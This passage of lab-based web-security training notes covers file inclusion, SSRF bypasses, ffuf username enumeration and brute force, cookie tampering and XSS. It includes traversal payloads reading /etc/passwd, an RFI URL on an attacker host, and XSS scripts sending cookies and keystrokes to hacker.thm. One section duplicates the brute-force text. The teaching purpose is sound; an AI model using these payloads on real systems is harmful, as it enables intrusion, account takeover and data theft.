<p>If there is no input validation, the attacker can manipulate the URL by replacing the&nbsp;lang&nbsp;input with other OS-sensitive files such as&nbsp;/etc/passwd.</p>
<p>Again the payload looks similar to the&nbsp;path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:</p>
<p>http://webapp.thm/index.php?lang=../../../../etc/passwd</p>
<p>&nbsp;</p>
<p><strong>1.</strong>&nbsp;In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing black box testing, in which we don't have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app.</p>
<p>In this scenario, we have the following entry point:&nbsp;http://webapp.thm/index.php?lang=EN. If we enter an invalid input, such as THM, we get the following error</p>
<pre><code class="language-plaintext">Warning</code></pre>
<p><br><br>&nbsp;</p>
<p>The error message discloses&nbsp;significant information. By entering THM as input, an error message shows what the include function looks like:&nbsp;&nbsp;include(languages/THM.php);.&nbsp;</p>
<p>If you look at the directory closely, we can tell the function includes files in the languages directory is adding&nbsp;&nbsp;.php&nbsp;at the end of the entry. Thus the valid input will be something as follows:&nbsp;&nbsp;index.php?lang=EN,&nbsp;where the file&nbsp;EN&nbsp;is located inside the given&nbsp;languages&nbsp;directory and named&nbsp;&nbsp;EN.php.&nbsp;</p>
<p>Also, the error message disclosed another important piece of information about the full web application directory path which is&nbsp;/var/www/html/THM-4/</p>
<p>To exploit this, we need to use the&nbsp;../&nbsp;trick, as described in the directory traversal section, to get out the current folder. Let's try the following:</p>
<p>http://webapp.thm/index.php?lang=../../../../etc/passwd</p>
<p>Note that we used 4&nbsp;../&nbsp;because we know the path has four levels&nbsp;/var/www/html/THM-4. But we still receive the following error:</p>
<pre><code class="language-plaintext">Warning</code></pre>
<p>It seems we could move out of the PHP directory but still, the&nbsp;include&nbsp;function reads the input with&nbsp;.php&nbsp;at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is&nbsp;%00.</p>
<p>Using null bytes is an injection technique where URL-encoded representation such as&nbsp;%00&nbsp;or&nbsp;0x00&nbsp;in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.</p>
<p>By adding the Null Byte at the end of the payload, we tell the&nbsp;&nbsp;include&nbsp;function to ignore anything after the null byte which may look like:</p>
<p>include("languages/../../../../../etc/passwd%00").".php");&nbsp;which equivalent to&nbsp;&nbsp;include("languages/../../../../../etc/passwd");</p>
<p>NOTE: the&nbsp;%00&nbsp;trick is fixed and not working with&nbsp;<u>PHP 5.3.4</u>&nbsp;and above.</p>
<p>&nbsp;</p>
<p><strong>2.</strong>&nbsp;In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The&nbsp;/etc/passwd&nbsp;file is being filtered. There are two possible methods to bypass the filter.&nbsp;First, by using the NullByte&nbsp;%00&nbsp;or the current directory trick at the end of the filtered keyword&nbsp;/..&nbsp;The exploit will be similar to&nbsp;http://webapp.thm/index.php?lang=/etc/passwd/.&nbsp;We could also use&nbsp;http://webapp.thm/index.php?lang=/etc/passwd%00.</p>
<p>To make it clearer, if we try this concept in the file system using&nbsp;cd ..,&nbsp;it will get you back one step; however, if you do&nbsp;cd .,&nbsp;It stays in the current directory.&nbsp;&nbsp;Similarly, if we try&nbsp; /etc/passwd/..,&nbsp;it results to be&nbsp; /etc/&nbsp;and that's&nbsp;because we moved one to the root.&nbsp; Now if we try&nbsp;&nbsp;/etc/passwd/.,&nbsp;the result will be&nbsp; /etc/passwd&nbsp;since dot refers to the current directory.</p>
<p><u>Now apply this technique in Lab #4 and figure out to read /etc/passwd.</u></p>
<p>&nbsp;</p>
<p><strong>3.</strong>&nbsp;Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let's test out and check the error message!</p>
<p>http://webapp.thm/index.php?lang=../../../../etc/passwd<br><br>&nbsp;</p>
<p>We got the following error!</p>
<p><code>Warning</code>:<code>&nbsp;</code>include(<code>languages</code>/<code>etc</code>/<code>passwd</code>):<code>&nbsp;</code>failed<code> to open stream</code>:<code> No such file&nbsp;</code>or<code> directory in&nbsp;</code>/var/<code>www</code>/<code>html</code>/THM-5/<code>index</code>.<code>php on line&nbsp;</code>15</p>
<p>&nbsp;</p>
<p>If we check the warning message in the&nbsp;include(languages/etc/passwd)&nbsp;section, we know that the web application replaces the&nbsp;../&nbsp;with the empty string. There are a couple of techniques we can use to bypass this.</p>
<p><strong>First</strong>, we can send the following payload to bypass it:&nbsp;....//....//....//....//....//etc/passwd</p>
<p><strong>Why did this work?</strong></p>
<p>This works because the PHP filter only matches and replaces the first subset string&nbsp;../&nbsp;it finds and doesn't do another pass, leaving what is pictured below.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image069.png" alt="Afbeelding met tekst, antenne

Automatisch gegenereerde beschrijving"></figure>
<p>&nbsp;</p>
<p><strong>4.</strong>&nbsp;Finally, we'll discuss the case where the developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as:&nbsp;http://webapp.thm/index.php?lang=languages/EN.php&nbsp;then, to exploit this, we need to include the directory in the payload like so:&nbsp;?lang=languages/../../../../../etc/passwd.</p>
<p>&nbsp;</p>
<h3>Remote file inclusion</h3>
<p>Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into&nbsp;include&nbsp;function. One requirement for RFI is that the&nbsp;allow_url_fopen&nbsp;option needs to be&nbsp;on.</p>
<p>&nbsp;</p>
<p>The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server.&nbsp;Other consequences of a successful RFI attack include:</p>
<ul>
  <li>Sensitive Information Disclosure</li>
  <li>Cross-site Scripting (XSS)</li>
  <li>Denial of Service (DoS)</li>
</ul>
<p>&nbsp;</p>
<p>An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image071.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p><br><br>&nbsp;</p>
<p><strong>RFI steps</strong></p>
<p>The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server&nbsp;http://attacker.thm/cmd.txt&nbsp;where&nbsp;cmd.txt&nbsp;contains a printing message&nbsp; Hello THM.</p>
<p><strong>&lt;?PHP</strong>&nbsp;echo&nbsp;"Hello THM";&nbsp;<strong>?&gt;</strong></p>
<p>First, the attacker injects the malicious URL, which points to the attacker's server, such as&nbsp;http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a&nbsp;GET&nbsp;request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the&nbsp;Hello THM&nbsp;message.</p>
<p>&nbsp;</p>
<h3>SSRF</h3>
<p>SSRF stands for Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.</p>
<p><br><br>&nbsp;</p>
<p><strong>Types of SSRF</strong></p>
<p>There are two types of SSRF vulnerability; the first is a regular SSRF where data is returned to the attacker's screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen.</p>
<p>What's the impact?</p>
<p>A successful SSRF attack can result in any of the following:&nbsp;</p>
<ul>
  <li>Access to unauthorised areas.</li>
  <li>Access to customer/organisational data.</li>
  <li>Ability to Scale to internal networks.</li>
  <li>Reveal authentication tokens/credentials.</li>
</ul>
<p>&nbsp;</p>
<p>Potential SSRF vulnerabilities can be spotted in web applications in many different ways. Here is an example of four common places to look:</p>
<p><strong>When a full URL is used in a parameter in the address bar:</strong></p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image073.jpg"></figure>
<p><strong>A hidden field in a form:</strong></p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image074.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p><strong>A partial URL such as just the hostname:</strong></p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image076.jpg"></figure>
<p><br><br>&nbsp;</p>
<p><strong>Or perhaps only the path of the URL:</strong></p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image078.jpg"></figure>
<p>Some of these examples are easier to exploit than others, and this is where a lot of trial and error will be required to find a working payload.</p>
<p>If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client.</p>
<p>&nbsp;</p>
<p>More security-savvy developers aware of the risks of SSRF vulnerabilities may implement checks in their applications to make sure the requested resource meets specific rules. There are usually two approaches to this, either a deny list or an allow list.<br><br>&nbsp;</p>
<p><strong>Deny List</strong></p>
<p>A Deny List is where all requests are accepted apart from resources specified in a list or matching a particular pattern. A Web Application may employ a deny list to protect sensitive endpoints, IP addresses or domains from being accessed by the public while still allowing access to other locations. A specific endpoint to restrict access is the localhost, which may contain server performance data or further sensitive information, so domain names such as localhost and 127.0.0.1 would appear on a deny list. Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.</p>
<p>&nbsp;</p>
<p>Also, in a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254.</p>
<p>&nbsp;</p>
<p><strong>Allow List</strong></p>
<p>An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with&nbsp;<strong>https://website.thm.</strong>&nbsp;An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.</p>
<p>&nbsp;</p>
<p><strong>Open Redirect</strong></p>
<p>If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.</p>
<p>&nbsp;</p>
<h2>Broken authentication mechanisms</h2>
<p>Authentication and session management constitute core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. A user would enter these credentials, the server would verify them. If they are correct, the server would then provide the users browser with a session cookie. A session cookie is needed because web servers use HTTP(S) to communicate which is stateless. Attaching session cookies means that the server will know who is sending what data. The server can then keep track of users' actions.&nbsp;</p>
<p>&nbsp;</p>
<p>If an attacker is able to find flaws in an authentication mechanism, they would then successfully gain access to other users accounts. This would allow the attacker to access sensitive data (depending on the purpose of the application). Some common flaws in authentication mechanisms include:<br><br>&nbsp;</p>
<p>Brute force attacks: If a web application uses usernames and passwords, an attacker is able to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts.&nbsp;</p>
<p>Use of weak credentials: web applications should set strong password policies. If applications allow users to set passwords such as password1 or common passwords, then an attacker is able to easily guess them and access user accounts. They can do this without brute forcing and without multiple attempts.</p>
<p>Weak Session Cookies: Session cookies are how the server keeps track of users. If session cookies contain predictable values, an attacker can set their own session cookies and access users accounts.&nbsp;</p>
<p>There can be various mitigation for broken authentication mechanisms depending on the exact flaw:</p>
<p>To avoid password guessing attacks, ensure the application enforces a strong password policy.&nbsp;</p>
<p>To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute force attacks.</p>
<p>Implement Multi Factor Authentication - If a user has multiple methods of authentication, for example, using username and passwords and receiving a code on their mobile device, then it would be difficult for an attacker to get access to both credentials to get access to their account.</p>
<p>&nbsp;</p>
<h3>Username enumeration</h3>
<p>A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames, which we'll use later in other tasks.</p>
<p>&nbsp;</p>
<p>Website error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT Support website (<a href="http://machine_ip/customers/signup">http://MACHINE_IP/customers/signup</a>) signup page.</p>
<p>&nbsp;</p>
<p>If you try entering the username&nbsp;<strong>admin</strong>&nbsp;and fill in the other form fields with fake information, you'll see we get the error&nbsp;<strong>An account with this username already exists</strong>. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.</p>
<p>&nbsp;</p>
<p>Username enumeration with ffuf</p>
<p>user@tryhackme</p>
<p><strong>$</strong></p>
<p>&nbsp;ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d&nbsp;"username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x" -H&nbsp;"Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr&nbsp;"username already exists"</p>
<p>In the above example, the&nbsp;<code>-w</code>&nbsp;argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. The&nbsp;<code>-X</code>&nbsp;argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The&nbsp;<code>-d</code>&nbsp;argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to&nbsp;<strong>FUZZ</strong>. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The&nbsp;<code>-H</code>&nbsp;argument is used for adding additional headers to the request. In this instance, we're setting the&nbsp;<code>Content-Type</code>&nbsp;to the webserver knows we are sending form data. The&nbsp;<code>-u</code>&nbsp;argument specifies the URL we are making the request to, and finally, the&nbsp;<code>-mr</code>&nbsp;argument is the text on the page we are looking for to validate we've found a valid username.</p>
<p>The ffuf tool and wordlist come pre-installed on the&nbsp;<strong>AttackBox</strong>&nbsp;or can be installed locally by downloading it from&nbsp;<a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a>.</p>
<p>&nbsp;</p>
<h3>Brute force</h3>
<p>Using the valid_usernames.txt file we generated in the previous task, we can now use this to attempt a brute force attack on the login page (<a href="http://machine_ip/customers/login">http://MACHINE_IP/customers/login</a>).</p>
<p>&nbsp;</p>
<p>A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.</p>
<p>&nbsp;</p>
<p>When running this command, make sure the terminal is in the same directory as the valid_usernames.txt file.</p>
<p>&nbsp;</p>
<p>Bruteforcing with ffuf</p>
<p>user@tryhackme</p>
<p><strong>$</strong></p>
<p>&nbsp;ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d&nbsp;"username=W1&amp;password=W2" -H&nbsp;"Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc&nbsp;200</p>
<p>This ffuf command is a little different to the previous one in Task 2. Previously we used the&nbsp;<strong>FUZZ</strong>&nbsp;keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen&nbsp;<code>W1</code>&nbsp;for our list of valid usernames and&nbsp;<code>W2</code>&nbsp;for the list of passwords we will try. The multiple wordlists are again specified with the&nbsp;<code>-w</code>&nbsp;argument but separated with a comma.&nbsp; For a positive match, we're using the&nbsp;<code>-fc</code>&nbsp;argument to check for an&nbsp;HTTP&nbsp;status code other than 200.</p>
<p>&nbsp;</p>
<h3>Logic flaw</h3>
<p>Using the valid_usernames.txt file we generated in the previous task, we can now use this to attempt a brute force attack on the login page (<a href="http://machine_ip/customers/login">http://MACHINE_IP/customers/login</a>).</p>
<p>&nbsp;</p>
<p>A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.</p>
<p>&nbsp;</p>
<p>When running this command, make sure the terminal is in the same directory as the valid_usernames.txt file.</p>
<p>&nbsp;</p>
<p>Bruteforcing with ffuf</p>
<p>user@tryhackme</p>
<p><strong>$</strong></p>
<p>&nbsp;ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d&nbsp;"username=W1&amp;password=W2" -H&nbsp;"Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc&nbsp;200</p>
<p>This ffuf command is a little different to the previous one in Task 2. Previously we used the&nbsp;<strong>FUZZ</strong>&nbsp;keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen&nbsp;<code>W1</code>&nbsp;for our list of valid usernames and&nbsp;<code>W2</code>&nbsp;for the list of passwords we will try. The multiple wordlists are again specified with the&nbsp;<code>-w</code>&nbsp;argument but separated with a comma.&nbsp; For a positive match, we're using the&nbsp;<code>-fc</code>&nbsp;argument to check for an&nbsp;HTTP&nbsp;status code other than 200.</p>
<p>&nbsp;</p>
<h3>Cookie tampering</h3>
<p>Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges. If you need a refresher on cookies, check out the&nbsp;<a href="https://tryhackme.com/room/httpindetail">HTTP In Detail</a>&nbsp;room on task 6.</p>
<p>&nbsp;</p>
<p><strong>Plain Text</strong></p>
<p>The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:</p>
<p><strong>Set-Cookie: logged_in=true; Max-Age=3600; Path=/</strong><br><strong>Set-Cookie: admin=false; Max-Age=3600; Path=/</strong></p>
<p>We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.</p>
<p>First, we'll start just by requesting the target page:<br><br>&nbsp;</p>
<p>user@tryhackme</p>
<p><strong>$</strong></p>
<p>&nbsp;curl http://MACHINE_IP/cookie-test</p>
<p>We can see we are returned a message of:&nbsp;<strong>Not Logged In</strong></p>
<p>Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:<br><br>&nbsp;</p>
<p>Curl Request 2</p>
<p>user@tryhackme</p>
<p><strong>$</strong></p>
<p>&nbsp;curl -H&nbsp;"Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test</p>
<p>We are given the message:&nbsp;<strong>Logged In As A User</strong></p>
<p>Finally, we'll send one last request setting both the logged_in and admin cookie to true:<br><br>&nbsp;</p>
<p>Curl Request 3</p>
<p>user@tryhackme</p>
<p><strong>$</strong></p>
<p>&nbsp;curl -H&nbsp;"Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test</p>
<p>This returns the result:&nbsp;<strong>Logged In As An Admin</strong>&nbsp;as well as a flag which you can use to answer question one.<br><br>&nbsp;</p>
<p><strong>Hashing</strong></p>
<p>Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text.&nbsp;Here are some examples that you may come across:</p>
<figure class="table" style="width:100.0%;">
  <table style="border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;width:6.42%;"><strong>Original String</strong></td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;width:20.1%;"><strong>Hash Method</strong></td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;width:73.48%;"><strong>Output</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;width:6.42%;">1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;width:20.1%;">md5</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;width:73.48%;">c4ca4238a0b923820dcc509a6f75849b</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;width:6.42%;">1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;width:20.1%;">sha-256</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;width:73.48%;">6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;width:6.42%;">1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;width:20.1%;">sha-512</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;width:73.48%;">4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;width:6.42%;">1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;width:20.1%;">sha1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;width:73.48%;">356a192b7913b04c54574d18c28d46e6395428ab</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>You can see from the above table that the hash output from the same input string can significantly differ depending on the hash method in use. Even though the hash is irreversible, the same output is produced every time, which is helpful for us as services such as&nbsp;<a href="https://crackstation.net/">https://crackstation.net/</a>&nbsp;keep databases of billions of hashes and their original strings.<br><br>&nbsp;</p>
<p><strong>Encoding</strong></p>
<p>Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.<br><br>Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.</p>
<p><br>Take the below data as an example which is set by the web server upon logging in:</p>
<p><strong>Set-Cookie:&nbsp;session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/</strong><br><br>&nbsp;</p>
<p>This string base64 decoded has the value of&nbsp;<strong>{"id":1,"admin": false}</strong>&nbsp;we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.</p>
<p>&nbsp;</p>
<h3>Cross-site scripting</h3>
<p>It's worth noting that because XSS is based on JavaScript, it would be helpful to have a basic understanding of the language. However, none of the examples is overly complicatedalso, a basic understanding of Client-Server requests and responses.</p>
<p>&nbsp;</p>
<p>Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you'll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.</p>
<p>&nbsp;</p>
<p>Cross-site scripting vulnerabilities are extremely common. Below are a few reports of XSS found in massive applications; you can get paid very well for finding and reporting these vulnerabilities.&nbsp;&nbsp;</p>
<p>&nbsp;</p>
<h4>Payloads</h4>
<p>In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.</p>
<p>&nbsp;</p>
<p>The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).</p>
<p>&nbsp;</p>
<p>Here are some examples of XSS intentions.</p>
<p>&nbsp;</p>
<p><strong>Proof Of Concept:</strong></p>
<p>This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:</p>
<p>&nbsp;</p>
<p><code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code></p>
<p>&nbsp;</p>
<p><strong>Session Stealing:</strong></p>
<p>Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.</p>
<p><br><br>&nbsp;</p>
<p><code>&lt;script&gt;fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));&lt;/script&gt;</code></p>
<p>&nbsp;</p>
<p><strong>Key Logger:</strong></p>
<p>The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.</p>
<p>&nbsp;</p>
<p><code>&lt;script&gt;document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}&lt;/script&gt;</code></p>
<p>&nbsp;</p>
<p><strong>Business Logic:</strong></p>
<p>This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called&nbsp;<code>user.changeEmail()</code>. Your payload could look like this:</p>
<p>&nbsp;</p>
<p><code>&lt;script&gt;user.changeEmail('attacker@hacker.thm');&lt;/script&gt;</code></p>
<p>&nbsp;</p>
<p>Now that the email address for the account has changed, the attacker may perform a reset password attack.</p>
<p>&nbsp;</p>
<h4>Reflected XSS</h4>
<p>Reflected XSS happens when user-supplied data in an&nbsp;HTTP&nbsp;request is included in the webpage source without any validation.</p>
<p><br><strong>Example Scenario:</strong><br>A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the&nbsp;<strong>error</strong>&nbsp;parameter in the query string and is built directly into the page source.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image080.png"></figure>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image082.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>The application doesn't check the contents of the&nbsp;<strong>error</strong>&nbsp;parameter, which allows the attacker to insert malicious code.</p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image083.png"></figure>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image085.png"></figure>
<p>The vulnerability can be used as per the scenario in the image below:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image087.png"></figure>
<p><strong>Potential Impact:</strong><br><br>The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.</p>
<p><strong>How to test for Reflected XSS:</strong></p>
<p>You'll need to test every possible point of entry; these include:</p>
<p>Parameters in the URL Query String</p>
<p>URL File Path</p>
<p>Sometimes&nbsp;HTTP&nbsp;Headers (although unlikely exploitable in practice)</p>
<p>&nbsp;</p>
<h4>Stored XSS</h4>
<p>As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.<br><br><strong>Example Scenario:</strong><br><br>A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image089.png" alt="Afbeelding met tekst, speler, schermafbeelding

Automatisch gegenereerde beschrijving"></figure>
<p>&nbsp;</p>
<p><strong>Potential Impact:</strong><br><br>The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.</p>
<p><strong>How to test for Stored XSS:</strong></p>
<p>You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:</p>
